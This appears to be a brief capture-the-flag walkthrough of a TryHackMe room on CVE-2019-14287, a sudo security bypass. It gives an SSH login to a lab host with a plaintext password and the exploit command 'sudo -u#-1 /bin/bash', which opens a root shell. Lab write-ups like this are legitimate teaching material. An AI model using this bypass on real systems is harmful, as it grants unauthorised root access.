---
description: A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program
---

# Sudo Security Bypass

## :top: Security Bypass

### #1 **What command are you allowed to run with sudo?**

```
sshpass -p tryhackme ssh -p 2222 tryhackme@10.10.28.74
sudo -l
```

![](<../../.gitbook/assets/Screenshot from 2020-08-24 09-03-23.png>)

### **#2 What is the flag in /root/root.txt?**

```
sudo -u#-1 /bin/bash
```

![](<../../.gitbook/assets/Screenshot from 2020-08-24 09-17-21.png>)
